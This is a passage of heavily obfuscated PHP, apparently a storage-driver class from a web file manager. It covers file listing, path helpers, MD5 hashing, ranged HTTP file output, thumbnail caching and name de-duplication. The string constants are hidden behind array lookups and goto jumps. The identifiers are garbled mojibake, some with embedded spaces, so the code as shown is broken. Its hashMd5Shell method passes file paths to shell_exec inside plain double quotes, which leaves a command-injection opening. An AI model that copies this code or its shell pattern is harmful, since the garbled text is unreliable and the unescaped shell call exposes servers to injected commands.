$C¦â‘ğ“­§[$E÷’Áğ—­Û[84]]; } if (!$d°•â¸òé) { $cæì³†ŠÜˆ[] = $e³‡à÷ğøç; continue; } $cæì³†ŠÜˆ[] = $e³‡à÷ğøç; goto cÈ¢ğÅ©†; c‡­›È¤´: } } public function listAllSimple($eÊ»íğ¥ŠÍ) { $DùÜÙéÖ“Ş =& $_SERVER[›èö’ù¤]; $FÖÍôÂ¿œ§ = array(); $A‡”‹Í¦àÙ = $this->listAll($eÊ»íğ¥ŠÍ); $aáÖ†‹Û— = $this->getPathOuter($eÊ»íğ¥ŠÍ); foreach ($A‡”‹Í¦àÙ as $Aè‰ñÑ‡Æ) { goto E÷èñ™¦Ší; bÄŸŒíÛ†Ã: if (!$Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[77]]) { $DÍÓèä‚Óª[$DùÜÙéÖ“Ş[86]] = $E®Ÿğ‹¥³; } $FÖÍôÂ¿œ§[] = $DÍÓèä‚Óª; goto få´¹øìã™; E÷èñ™¦Ší: $E®Ÿğ‹¥³ = $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[76]]; $CŒ­µ÷ò¡ª = $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[76]]; if (isset($Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[85]])) { $E®Ÿğ‹¥³ = $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[85]][$DùÜÙéÖ“Ş[76]]; $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[78]] = $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[85]][$DùÜÙéÖ“Ş[78]]; $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[84]] = $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[85]][$DùÜÙéÖ“Ş[84]]; } else { $CŒ­µ÷ò¡ª = substr($Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[76]], strlen(get_path_father($aáÖ†‹Û—))); $CŒ­µ÷ò¡ª = $DùÜÙéÖ“Ş[8] . ltrim($CŒ­µ÷ò¡ª, $DùÜÙéÖ“Ş[8]); } goto B²ÔîåÜÀÆ; B²ÔîåÜÀÆ: $DÍÓèä‚Óª = array($DùÜÙéÖ“Ş[76] => $CŒ­µ÷ò¡ª, $DùÜÙéÖ“Ş[77] => $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[77]]); if (isset($Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[78]]) && !$Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[77]]) { $DÍÓèä‚Óª[$DùÜÙéÖ“Ş[78]] = $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[78]]; } if (isset($Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[84]])) { $DÍÓèä‚Óª[$DùÜÙéÖ“Ş[84]] = $Aè‰ñÑ‡Æ[$DùÜÙéÖ“Ş[84]]; } goto bÄŸŒíÛ†Ã; få´¹øìã™: } return $FÖÍôÂ¿œ§; } public function upload($E–ù”¨ˆÙ, $F¨ë…É¼”†, $Aœ¼‚»ö = false, $dòº‰¦œ = REPEAT_REPLACE) { } public function uploadFileByID($fÄÚ…†‘ËÍ, $c˜Ê¾¸Šíƒ, $c¢‰åÉ¶¡Ô) { } public function uploadFileByPath($Có‡ÍŸÇÌÃ, $bÕçÌÂé¶Å, $dÜËè«ùô± = array()) { } public function isUploadServer() { $bà‹›Ş¡Ó =& $_SERVER[›èö’ù¤]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $bà‹›Ş¡Ó[87]) { return !0; } return $GLOBALS[$bà‹›Ş¡Ó[6]][$bà‹›Ş¡Ó[88]][$bà‹›Ş¡Ó[89]]; } public function isFileOutServer() { $e…‰§¢íö =& $_SERVER[›èö’ù¤]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $e…‰§¢íö[87]) { return !0; } return $GLOBALS[$e…‰§¢íö[6]][$e…‰§¢íö[88]][$e…‰§¢íö[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($F‘Ø¸©Û®·) { $e”É¦øò£÷ =& $_SERVER[›èö’ù¤]; if (!$this->isCdnHost()) { return $F‘Ø¸©Û®·; } return str_replace(trim(get_url_root($F‘Ø¸©Û®·), $e”É¦øò£÷[8]), trim($this->cdnHost, $e”É¦øò£÷[8]), $F‘Ø¸©Û®·); } public function uploadLink($b‘Œ¨Ê¨¾, $A‚ªƒŒğâ = 0) { goto a“ù˜Â‚½Ï; E¥®¿ÔÅÎÓ: if (!in_array($CÂ¾øßÒƒ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $dê‘‘…©Ä° = 1024 * 1024 * 10; goto D‰çÂœ‘°í; a“ù˜Â‚½Ï: $CêùµË×ŠÑ =& $_SERVER[›èö’ù¤]; if ($this->isUploadServer()) { return; } $CÂ¾øßÒƒ = $this->getType(); goto E¥®¿ÔÅÎÓ; D‰çÂœ‘°í: $Aİ“Œ›à¢ = $A‚ªƒŒğâ <= $dê‘‘…©Ä° ? $CêùµË×ŠÑ[91] : $CêùµË×ŠÑ[92]; $BïëğêÜË = (!$A‚ªƒŒğâ ? 1 : ceil($A‚ªƒŒğâ / pow(1024, 3))) * 3600 * 4; $F®‘Ö†ˆ = $this->{$Aİ“Œ›à¢}($b‘Œ¨Ê¨¾, $BïëğêÜË); goto C¬äÈØÒ™¿; C¬äÈØÒ™¿: if ($F®‘Ö†ˆ) { $F®‘Ö†ˆ[$CêùµË×ŠÑ[93]] = $b‘Œ¨Ê¨¾; $F®‘Ö†ˆ[$CêùµË×ŠÑ[94]] = $CÂ¾øßÒƒ; } return $F®‘Ö†ˆ; goto Bå³Æ¸Ü©Ï; Bå³Æ¸Ü©Ï: } public function uploadFormData($b¿éöª‡, $D¯¨õğ¤Áè = 3600) { } public function multiUploadFormData($AÒ®ËËÕè£, $fĞ¹›é‚”é = 3600) { } public function download($CÊÊ™ßìğ, $F±å»ßÙ¶) { } public function ext($Fñ¦ÖÏ´…æ) { $E¢ÆÃŠË´ =& $_SERVER[›èö’ù¤]; if (strpos($Fñ¦ÖÏ´…æ, $E¢ÆÃŠË´[8]) === -1) { $f³ù‰‹øÖ´ = $Fñ¦ÖÏ´…æ; } else { $f³ù‰‹øÖ´ = $this->pathThis($Fñ¦ÖÏ´…æ); } $aŠó‚…º ğ = $E¢ÆÃŠË´[33]; if (strstr($f³ù‰‹øÖ´, $E¢ÆÃŠË´[95])) { $aŠó‚…º ğ = substr($f³ù‰‹øÖ´, strrpos($f³ù‰‹øÖ´, $E¢ÆÃŠË´[95]) + 1); $aŠó‚…º ğ = strtolower($aŠó‚…º ğ); } if (strlen($aŠó‚…º ğ) > 3 && preg_match($E¢ÆÃŠË´[96], $aŠó‚…º ğ, $Aêª£†ƒ­Ñ)) { $aŠó‚…º ğ = $E¢ÆÃŠË´[33]; } return $aŠó‚…º ğ; } public function pathThis($fàÆÓâôæÍ) { $dİĞ¼â±´„ =& $_SERVER[›èö’ù¤]; $fàÆÓâôæÍ = str_replace($dİĞ¼â±´„[97], $dİĞ¼â±´„[8], rtrim($fàÆÓâôæÍ, $dİĞ¼â±´„[8])); $Dº›¶³ê’ = strrpos($fàÆÓâôæÍ, $dİĞ¼â±´„[8]); if ($Dº›¶³ê’ === !1) { return $fàÆÓâôæÍ; } return substr($fàÆÓâôæÍ, $Dº›¶³ê’ + 1); } public function pathFather($EÓÂ‘­ìóŒ) { $dÇ¼êµš¶ò =& $_SERVER[›èö’ù¤]; $EÓÂ‘­ìóŒ = str_replace($dÇ¼êµš¶ò[97], $dÇ¼êµš¶ò[8], rtrim($EÓÂ‘­ìóŒ, $dÇ¼êµš¶ò[8])); $f‹¾”¡Â„ƒ = strrpos($EÓÂ‘­ìóŒ, $dÇ¼êµš¶ò[8]); if ($f‹¾”¡Â„ƒ === !1) { return $dÇ¼êµš¶ò[33]; } return substr($EÓÂ‘­ìóŒ, 0, $f‹¾”¡Â„ƒ + 1); } public function hashSimple($cÄÒ•¢”¬) { goto B–²›Çóˆ; B–²›Çóˆ: $AƒÂÃŒš±Õ =& $_SERVER[›èö’ù¤]; if (!$cÄÒ•¢”¬) { return md5($AƒÂÃŒš±Õ[33]); } $aï¥ì¬Áôè = $this->size($cÄÒ•¢”¬); goto Cš´Şì Ö…; d¡š½æî×’: $D¥ñŠœç× = intval($aï¥ì¬Áôè / $DÅØ©Ãªõ©); $Aã¸–¸Ì« = $AƒÂÃŒš±Õ[33]; for ($dÄ®˜·ºÄ = 0; $dÄ®˜·ºÄ < $DÅØ©Ãªõ©; $dÄ®˜·ºÄ++) { $Aã¸–¸Ì« .= $this->fileSubstr($cÄÒ•¢”¬, $D¥ñŠœç× * $dÄ®˜·ºÄ, $C¤ÛŒ¤Ú‹); } goto f¸¤ßÀ‡ÉÒ; Cš´Şì Ö…: $C¤ÛŒ¤Ú‹ = 200; $DÅØ©Ãªõ© = 50; if ($aï¥ì¬Áôè <= $C¤ÛŒ¤Ú‹ * $DÅØ©Ãªõ©) { return $this->hashMd5($cÄÒ•¢”¬) . $aï¥ì¬Áôè; } goto d¡š½æî×’; f¸¤ßÀ‡ÉÒ: $Aã¸–¸Ì« .= $this->fileSubstr($cÄÒ•¢”¬, $aï¥ì¬Áôè - $C¤ÛŒ¤Ú‹, $C¤ÛŒ¤Ú‹); return md5($Aã¸–¸Ì«) . $aï¥ì¬Áôè; goto Eªì¼¬÷ì×; Eªì¼¬÷ì×: } public static $md5Cache = array(); public function hashMd5($b¬ºí¨ˆ›é) { $b¬ºí¨ˆ›é = $this->iconvSystem($b¬ºí¨ˆ›é); if (isset(self::$md5Cache[$b¬ºí¨ˆ›é])) { return self::$md5Cache[$b¬ºí¨ˆ›é]; } self::$md5Cache[$b¬ºí¨ˆ›é] = $this->hashMd5Shell($b¬ºí¨ˆ›é); if (!self::$md5Cache[$b¬ºí¨ˆ›é]) { self::$md5Cache[$b¬ºí¨ˆ›é] = @md5_file($b¬ºí¨ˆ›é); } return self::$md5Cache[$b¬ºí¨ˆ›é]; } private function hashMd5Shell($Eç‡œ³Ğé) { goto FĞÚé‰¿µò; FĞÚé‰¿µò: $E¥ä™—ğµ¬ =& $_SERVER[›èö’ù¤]; if (!function_exists($E¥ä™—ğµ¬[98])) { return !1; } $D›®¤Ùœ± = array($E¥ä™—ğµ¬[99], $E¥ä™—ğµ¬[100]); goto a ÓÖ£‘††; fğŒø…İæ: $C„—¼ö‡¾ = shell_exec($F‡Ë‹³æ— . "\40\x22{$Eç‡œ³Ğé}\x22"); $C„—¼ö‡¾ = str_replace($E¥ä™—ğµ¬[104], $E¥ä™—ğµ¬[33], $C„—¼ö‡¾); return substr($C„—¼ö‡¾, 0, 32); goto bÒŠ·Àİ; a ÓÖ£‘††: $F‡Ë‹³æ— = Cache::get($E¥ä™—ğµ¬[101]); if (!$F‡Ë‹³æ—) { $cå¶Ñ˜­™à = BASIC_PATH . $E¥ä™—ğµ¬[102]; $bŠ¡Â‹ÈÕ = md5_file($cå¶Ñ˜­™à); $F‡Ë‹³æ— = $E¥ä™—ğµ¬[103]; foreach ($D›®¤Ùœ± as $E‚İëÅíË–) { $C„—¼ö‡¾ = shell_exec($E‚İëÅíË– . "\x20\42{$cå¶Ñ˜­™à}\x22"); if ($C„—¼ö‡¾ && substr(trim($C„—¼ö‡¾), 0, 32) == $bŠ¡Â‹ÈÕ) { $F‡Ë‹³æ— = $E‚İëÅíË–; break; } } Cache::set($E¥ä™—ğµ¬[101], $F‡Ë‹³æ—, 3600); } if ($F‡Ë‹³æ— == $E¥ä™—ğµ¬[103]) { return !1; } goto fğŒø…İæ; bÒŠ·Àİ: } public function link($BÉ…æÛİ—”) { return $BÉ…æÛİ—”; } public function fileOut($bÊ‚íÜ‹©, $cà©àÊËÍ = false, $AŒ ÂŠ‚Â = false, $dĞ¸¨ÕĞ‹· = '') { goto C†Ï®’¬¢; CŒ»‹é¥±•: $døÒ‰ù ¤© = 0; $Cæ‘È’ÎË» = $FÒ×Üˆ°İ¾ - 1; $eñ˜…¬‹ò = $this->ext($aœæ‰¨¯–œ); goto FïÙÓì”¯; B… ©šå¹: $FÒ×Üˆ°İ¾ = $B¼ŸÉµ¯ßó[$A²áË—éêÙ[78]]; $eÊ‘íÜÒšî = gmdate($A²áË—éêÙ[110], $B¼ŸÉµ¯ßó[$A²áË—éêÙ[84]]); $aœæ‰¨¯–œ = $AŒ ÂŠ‚Â ? $AŒ ÂŠ‚Â : $this->iconvApp($B¼ŸÉµ¯ßó[$A²áË—éêÙ[28]]); goto CŒ»‹é¥±•; FïÙÓì”¯: if (in_array($eñ˜…¬‹ò, array($A²áË—éêÙ[111], $A²áË—éêÙ[112], $A²áË—éêÙ[113], $A²áË—éêÙ[114]))) { $eñ˜…¬‹ò = $A²áË—éêÙ[115]; } if (!$dĞ¸¨ÕĞ‹·) { $dĞ¸¨ÕĞ‹· = md5($eÊ‘íÜÒšî . $this->hashSimple($bÊ‚íÜ‹©)); } $dĞ¸¨ÕĞ‹· = $A²áË—éêÙ[116] . $dĞ¸¨ÕĞ‹· . $A²áË—éêÙ[116]; goto Cç­ÚÂ…Ø˜; F‹À§ç­‡: $c…‘ÔÇËß = !0; if ($_SERVER[$A²áË—éêÙ[154]] == $A²áË—éêÙ[155] && $FÒ×Üˆ°İ¾ > 1204 * 1024 * 1024 * 2) { $c…‘ÔÇËß = !1; } if ($c…‘ÔÇËß) { header($A²áË—éêÙ[156] . ($Cæ‘È’ÎË» - $døÒ‰ù ¤© + 1)); } goto BºÎÓÈË»; b­®ğ¬¤Ó…: $e¯­ŒÛËÛò = $this->getType() == $A²áË—éêÙ[106]; $d¬–ƒ¯èŠ• = $GLOBALS[$A²áË—éêÙ[6]][$A²áË—éêÙ[88]][$A²áË—éêÙ[107]][$A²áË—éêÙ[108]]; $aˆ¡ÁË±”õ = (double) $GLOBALS[$A²áË—éêÙ[6]][$A²áË—éêÙ[88]][$A²áË—éêÙ[107]][$A²áË—éêÙ[109]] * 1024 * 1024; goto CÏ¼”ØÓÀ‹; d»ãë”ùÍÉ: $EÏÜƒÙ‘ô = strtolower($_SERVER[$A²áË—éêÙ[142]]); if ($e¯­ŒÛËÛò && $EÏÜƒÙ‘ô && $d¬–ƒ¯èŠ•) { if (strstr($EÏÜƒÙ‘ô, $A²áË—éêÙ[143])) { header($A²áË—éêÙ[144] . $bÊ‚íÜ‹©); } else { if (strstr($EÏÜƒÙ‘ô, $A²áË—éêÙ[145])) { header($A²áË—éêÙ[146] . $bÊ‚íÜ‹©); } else { if (strstr($EÏÜƒÙ‘ô, $A²áË—éêÙ[147])) { header($A²áË—éêÙ[148] . $bÊ‚íÜ‹©); } } } if ($aˆ¡ÁË±”õ) { header($A²áË—éêÙ[149] . $aˆ¡ÁË±”õ); } return; } if (isset($_SERVER[$A²áË—éêÙ[150]])) { if (preg_match($A²áË—éêÙ[151], $_SERVER[$A²áË—éêÙ[150]], $A˜ÎÂŠ³„)) { $døÒ‰ù ¤© = intval($A˜ÎÂŠ³„[1]); if (!empty($A˜ÎÂŠ³„[2])) { $Cæ‘È’ÎË» = intval($A˜ÎÂŠ³„[2]); } } header($A²áË—éêÙ[152]); header("\x43\157\156\x74\x65\156\x74\x2d\x52\141\x6e\147\145\x3a\x20\x62\171\164\145\163\x20{$døÒ‰ù ¤©}\55{$Cæ‘È’ÎË»}\x2f" . $FÒ×Üˆ°İ¾); } else { header($A²áË—éêÙ[153]); } goto F‹À§ç­‡; C†Ï®’¬¢: $A²áË—éêÙ =& $_SERVER[›èö’ù¤]; $this->cacheMethod(null, null); if (!$bÊ‚íÜ‹© || !$this->exist($bÊ‚íÜ‹©)) { show_json(LNG($A²áË—éêÙ[105]), !1, $AŒ ÂŠ‚Â); } goto b­®ğ¬¤Ó…; e”öŠ½Ñø: header($A²áË—éêÙ[120]); header($A²áË—éêÙ[121] . $c¸‹Êˆ¶É¦); $d¼Œ “¢Š³ = rawurlencode($aœæ‰¨¯–œ); goto EÁ¿öëô; B´£•º„ìÕ: header($A²áË—éêÙ[128]); header($A²áË—éêÙ[129]); header($A²áË—éêÙ[130]); goto dãˆ½Ô¤ÒÓ; BºÎÓÈË»: if ($_SERVER[$A²áË—éêÙ[157]] == $A²áË—éêÙ[158]) { return; } $DèØ¤±¹× = 1024 * 100; $dÃ‡¾¿Õ· = 0; goto AëµØôïĞˆ; EÁ¿öëô: $d¼Œ “¢Š³ = $A²áË—éêÙ[116] . $d¼Œ “¢Š³ . $A²áË—éêÙ[122] . $d¼Œ “¢Š³; if ($cà©àÊËÍ) { header($A²áË—éêÙ[123]); header($A²áË—éêÙ[124] . $d¼Œ “¢Š³); } else { header($A²áË—éêÙ[125] . $d¼Œ “¢Š³); } header($A²áË—éêÙ[126] . gmdate($A²áË—éêÙ[110], time() + 3600 * 24 * 30) . $A²áË—éêÙ[127]); goto B´£•º„ìÕ; Aö“Œ°‰©: header($A²áË—éêÙ[138] . $FÒ×Üˆ°İ¾); header($A²áË—éêÙ[139]); if (!$cà©àÊËÍ && $eñ˜…¬‹ò == $A²áË—éêÙ[140]) { if ($FÒ×Üˆ°İ¾ > 1024 * 1024 * 5) { die; } $A®¦ßÒÈø = $this->getContent($bÊ‚íÜ‹©); $A®¦ßÒÈø = Html::clearSVG($A®¦ßÒÈø); header($A²áË—éêÙ[141] . strlen($A®¦ßÒÈø)); echo $A®¦ßÒÈø; die; } goto d»ãë”ùÍÉ; AÔÛ†çíãí: header($A²áË—éêÙ[135] . $eÊ‘íÜÒšî . $A²áË—éêÙ[127]); header($A²áË—éêÙ[136] . $aœæ‰¨¯–œ); header($A²áË—éêÙ[137]); goto Aö“Œ°‰©; CÏ¼”ØÓÀ‹: @ob_end_clean(); set_timeout(); $B¼ŸÉµ¯ßó = $this->infoFull($bÊ‚íÜ‹©); goto B… ©šå¹; AëµØôïĞˆ: if ($aˆ¡ÁË±”õ) { $dÃ‡¾¿Õ· = intval(1000 * 1000 * ($DèØ¤±¹× / $aˆ¡ÁË±”õ)); } while ($døÒ‰ù ¤© <= $Cæ‘È’ÎË») { $bí™—Ïóˆ… = timeFloat(); check_abort(); $d™µ‡„Ò¼Ã = $Cæ‘È’ÎË» - $døÒ‰ù ¤© + 1; if ($d™µ‡„Ò¼Ã <= $DèØ¤±¹×) { $DèØ¤±¹× = $d™µ‡„Ò¼Ã; } echo $this->fileSubstr($bÊ‚íÜ‹©, $døÒ‰ù ¤©, $DèØ¤±¹×); $døÒ‰ù ¤© += $DèØ¤±¹×; if ($DèØ¤±¹× == $d™µ‡„Ò¼Ã) { $døÒ‰ù ¤© = $Cæ‘È’ÎË» + 1; } if ($dÃ‡¾¿Õ·) { $fß‚ÍÌ—¥Ã = intval(1000 * 1000 * (timeFloat() - $bí™—Ïóˆ…)); $Fè¾Š¶àÚå = $dÃ‡¾¿Õ· - $fß‚ÍÌ—¥Ã; if ($Fè¾Š¶àÚå > 5) { usleep($Fè¾Š¶àÚå); } } } goto A´»®ÏªÄñ; dãˆ½Ô¤ÒÓ: if (isset($_SERVER[$A²áË—éêÙ[131]]) && strtotime($_SERVER[$A²áË—éêÙ[131]]) == $B¼ŸÉµ¯ßó[$A²áË—éêÙ[84]]) { header($A²áË—éêÙ[132], !0, 304); die; } if (isset($_SERVER[$A²áË—éêÙ[133]]) && $_SERVER[$A²áË—éêÙ[133]] == $dĞ¸¨ÕĞ‹·) { header($A²áË—éêÙ[134] . $dĞ¸¨ÕĞ‹·, !0, 304); die; } header($A²áË—éêÙ[134] . $dĞ¸¨ÕĞ‹·); goto AÔÛ†çíãí; Cç­ÚÂ…Ø˜: $c¸‹Êˆ¶É¦ = get_file_mime($eñ˜…¬‹ò); if (strstr($c¸‹Êˆ¶É¦, $A²áË—éêÙ[117])) { $c¸‹Êˆ¶É¦ = $c¸‹Êˆ¶É¦ . $A²áË—éêÙ[118]; } if ($cà©àÊËÍ === !1 && !mime_support($c¸‹Êˆ¶É¦)) { $cà©àÊËÍ = !0; $c¸‹Êˆ¶É¦ = $A²áË—éêÙ[119]; } goto e”öŠ½Ñø; A´»®ÏªÄñ: } public function fileOutServer($fäÍœºá´É, $Cá´¥²ñÁÉ = false, $dã‰ó£Ìñ© = false, $Dø˜Ùá†®è = '') { $this->fileOut($fäÍœºá´É, $Cá´¥²ñÁÉ, $dã‰ó£Ìñ©, $Dø˜Ùá†®è); } public function fileOutLink($dé¶ä³Æ×é) { header($_SERVER[›èö’ù¤][159] . $dé¶ä³Æ×é); die; } public function cacheMethod($dâñ¥¯, $B…İºáÌÕ, $eÎ·™–ƒ·  = null) { goto cæÆî¶ãçõ; d‚¦Ñä‹÷Æ: $d½«œ†ŸŞ÷ = $this->{$dâñ¥¯}($B…İºáÌÕ); $Fğ®ªÍ†»[$ešÑ·‰½ï»] = $d½«œ†ŸŞ÷; return $d½«œ†ŸŞ÷; goto D¼ÍÏ—ù»; cæÆî¶ãçõ: $FÊŠ¼Ğ¹´É =& $_SERVER[›èö’ù¤]; static $Fğ®ªÍ†» = array(); $d¦‰ğ«ÂôÇ = $B…İºáÌÕ ? ltrim($this->getPathOuter($B…İºáÌÕ), $FÊŠ¼Ğ¹´É[8]) : $B…İºáÌÕ; goto câÎŠ˜¹¡Ü; D“‡Œ¿©Íã: if (!is_null($eÎ·™–ƒ· )) { $Fğ®ªÍ†»[$ešÑ·‰½ï»] = $eÎ·™–ƒ· ; return; } $d½«œ†ŸŞ÷ = isset($Fğ®ªÍ†»[$ešÑ·‰½ï»]) ? $Fğ®ªÍ†»[$ešÑ·‰½ï»] : null; if (!is_null($d½«œ†ŸŞ÷)) { return $d½«œ†ŸŞ÷; } goto d‚¦Ñä‹÷Æ; câÎŠ˜¹¡Ü: $ešÑ·‰½ï» = $FÊŠ¼Ğ¹´É[160] . $dâñ¥¯ . $FÊŠ¼Ğ¹´É[161] . rtrim($d¦‰ğ«ÂôÇ, $FÊŠ¼Ğ¹´É[8]); if (is_null($dâñ¥¯)) { $Fğ®ªÍ†» = array(); return; } if (is_null($B…İºáÌÕ)) { unset($Fğ®ªÍ†»[$ešÑ·‰½ï»]); return; } goto D“‡Œ¿©Íã; D¼ÍÏ—ù»: } public function fileOutImage($bœ·°»Ğœ, $aãœè·ÙĞù = 250) { goto cãÁÈ–‹…ã; C´÷¦Ò¨Ì: $AïŠ¯ŸğÓ = "{$fÏÜâ‘Ğ·Ï}\x5f{$aãœè·ÙĞù}\56\x70\x6e\147"; if (!($AØ›áõ‰Ñ¹ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $bÜìÖ¿ªò[172]))) { $c·¬Ä†ëß– = IO::mkdir(IO_PATH_SYSTEM_TEMP . $bÜìÖ¿ªò[173]); } else { $c·¬Ä†ëß– = KodIO::make($AØ›áõ‰Ñ¹); } if ($AØ›áõ‰Ñ¹ = IO::fileNameExist($c·¬Ä†ëß–, $AïŠ¯ŸğÓ)) { $aÆóÑÓÊ©˜ = KodIO::make($AØ›áõ‰Ñ¹); return IO::fileOut($aÆóÑÓÊ©˜, !1, $e¿Ò³Á«¦Š); } goto D²ˆï°£ê¬; cãÁÈ–‹…ã: $bÜìÖ¿ªò =& $_SERVER[›èö’ù¤]; set_timeout(); if (substr($bœ·°»Ğœ, 0, 4) == $bÜìÖ¿ªò[147]) { $this->fileOutLink($bœ·°»Ğœ); } goto e½êœŒï‚; e½êœŒï‚: $A¼ñÊŠÊÛ = $this->info($bœ·°»Ğœ); $e¿Ò³Á«¦Š = $A¼ñÊŠÊÛ[$bÜìÖ¿ªò[28]]; $cÀíÈÓªÁ = !1; goto Dø‘´·æÇ; Dø‘´·æÇ: if (isset($GLOBALS[$bÜìÖ¿ªò[162]]) && $GLOBALS[$bÜìÖ¿ªò[162]][$bÜìÖ¿ªò[76]] == $A¼ñÊŠÊÛ[$bÜìÖ¿ªò[76]]) { $E‘º¡ƒ­ø = $GLOBALS[$bÜìÖ¿ªò[162]][$bÜìÖ¿ªò[163]]; if (!$A¼ñÊŠÊÛ[$bÜìÖ¿ªò[164]]) { $A¼ñÊŠÊÛ[$bÜìÖ¿ªò[164]] = $GLOBALS[$bÜìÖ¿ªò[162]]; } if (isset($E‘º¡ƒ­ø[$bÜìÖ¿ªò[165]])) { if ($E‘º¡ƒ­ø[$bÜìÖ¿ªò[165]] <= $aãœè·ÙĞù && $E‘º¡ƒ­ø[$bÜìÖ¿ªò[166]] <= $aãœè·ÙĞù) { $cÀíÈÓªÁ = !0; } } $e¿Ò³Á«¦Š = $A¼ñÊŠÊÛ[$bÜìÖ¿ªò[164]][$bÜìÖ¿ªò[28]]; } if ($A¼ñÊŠÊÛ[$bÜìÖ¿ªò[78]] <= 1024 * 50 || $cÀíÈÓªÁ || !function_exists($bÜìÖ¿ªò[167]) || $A¼ñÊŠÊÛ[$bÜìÖ¿ªò[168]] == $bÜìÖ¿ªò[169]) { return $this->fileOut($bœ·°»Ğœ, !1, $e¿Ò³Á«¦Š); } if (isset($A¼ñÊŠÊÛ[$bÜìÖ¿ªò[164]][$bÜìÖ¿ªò[170]])) { $fÏÜâ‘Ğ·Ï = $A¼ñÊŠÊÛ[$bÜìÖ¿ªò[164]][$bÜìÖ¿ªò[170]]; } else { if (isset($A¼ñÊŠÊÛ[$bÜìÖ¿ªò[164]][$bÜìÖ¿ªò[171]])) { $fÏÜâ‘Ğ·Ï = $A¼ñÊŠÊÛ[$bÜìÖ¿ªò[164]][$bÜìÖ¿ªò[171]]; } else { $fÏÜâ‘Ğ·Ï = md5("{$A¼ñÊŠÊÛ[$bÜìÖ¿ªò[28]]}\x5f{$A¼ñÊŠÊÛ[$bÜìÖ¿ªò[76]]}\137{$A¼ñÊŠÊÛ[$bÜìÖ¿ªò[78]]}"); } } goto C´÷¦Ò¨Ì; DÍå‘ ×åÛ: del_file($aÆóÑÓÊ©˜); IO::fileOut($BÍÑ¤±õ–); goto FœæÂ¢…ìØ; aùäÌÜå‰: if (!@file_exists($aÆóÑÓÊ©˜)) { $dÄˆ¬Ú¶° = TEMP_FILES; if (!is_dir($dÄˆ¬Ú¶°)) { mk_dir($dÄˆ¬Ú¶°); } $BÕÀ®å†Ÿ´ = $dÄˆ¬Ú¶° . $fÏÜâ‘Ğ·Ï . $bÜìÖ¿ªò[95] . $A¼ñÊŠÊÛ[$bÜìÖ¿ªò[168]]; if (!@file_exists($BÕÀ®å†Ÿ´)) { $BÕÀ®å†Ÿ´ = $this->download($bœ·°»Ğœ, $BÕÀ®å†Ÿ´); } ImageThumb::createThumb($BÕÀ®å†Ÿ´, $aÆóÑÓÊ©˜, $aãœè·ÙĞù, $aãœè·ÙĞù * 10); } if (!file_exists($aÆóÑÓÊ©˜) || filesize($aÆóÑÓÊ©˜) < 100) { return @file_exists($BÕÀ®å†Ÿ´) ? IO::fileOut($BÕÀ®å†Ÿ´) : $this->fileOut($bœ·°»Ğœ); } if (!($BÍÑ¤±õ– = IO::move($aÆóÑÓÊ©˜, $c·¬Ä†ëß–))) { return IO::fileOut($aÆóÑÓÊ©˜); } goto DÍå‘ ×åÛ; D²ˆï°£ê¬: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $aÆóÑÓÊ©˜ = DATA_THUMB . $AïŠ¯ŸğÓ; del_file($aÆóÑÓÊ©˜); goto aùäÌÜå‰; FœæÂ¢…ìØ: } public function fileOutImageServer($C½ñÎïİÉ‰, $AĞ¨„ÕÅ°Ê = 250) { $this->fileOutImage($C½ñÎïİÉ‰, $AĞ¨„ÕÅ°Ê); } public function fileNameAuto($E•Æçñ´ç, $eÖîå½øŞ³, $bÂ¯ÌÃÃ¾½ = REPEAT_RENAME, $E¿ï¤ÁÏ¯ = false) { goto a¸˜œ‹®; C›ÙßñºÀà: $F…¥–£ò«å = 1; $f¯‚ê‚ÍŠ = substr($eÖîå½øŞ³, 0, strlen($eÖîå½øŞ³) - strlen($c“Äçï·º)); $fäîñ½‚• = $f¯‚ê‚ÍŠ . "\x28{$F…¥–£ò«å}\x29{$c“Äçï·º}"; goto BÀÓ‘ÅÛÂº; AåÒ‡«º¤ì: if ($bÂ¯ÌÃÃ¾½ == REPEAT_SKIP) { return !1; } $c“Äçï·º = $d­ç¦£–Œ[95] . get_path_ext($eÖîå½øŞ³); $c“Äçï·º = $c“Äçï·º == $d­ç¦£–Œ[95] || $E¿ï¤ÁÏ¯ ? $d­ç¦£–Œ[33] : $c“Äçï·º; goto C›ÙßñºÀà; BÀÓ‘ÅÛÂº: while ($this->exist(rtrim($E•Æçñ´ç, $d­ç¦£–Œ[8]) . $d­ç¦£–Œ[8] . $fäîñ½‚•)) { $fäîñ½‚• = $f¯‚ê‚ÍŠ . "\50{$F…¥–£ò«å}\x29{$c“Äçï·º}"; $F…¥–£ò«å++; } return $fäîñ½‚•; goto f‘ö†İë³; a¸˜œ‹®: $d­ç¦£–Œ =& $_SERVER[›èö’ù¤]; $b¼·ˆ¯ŸÔ = $E•Æçñ´ç === $d­ç¦£–Œ[33] ? $eÖîå½øŞ³ : rtrim($E•Æçñ´ç, $d­ç¦£–Œ[8]) . $d­ç¦£–Œ[8] . $eÖîå½øŞ³; if ($bÂ¯ÌÃÃ¾½ == REPEAT_REPLACE || !$this->exist($b¼·ˆ¯ŸÔ) || $E¿ï¤ÁÏ¯ && $bÂ¯ÌÃÃ¾½ != REPEAT_RENAME_FOLDER) { return $eÖîå½øŞ³; } goto AåÒ‡«º¤ì; f‘ö†İë³: } private function fileNameAutoList($A™Ò‘…—æÎ, $cÀ’Â¼Ô¾İ, $Fäš¹¢Ü = false) { goto C¨ ˆÉ‰¶ª; C¨ ˆÉ‰¶ª: 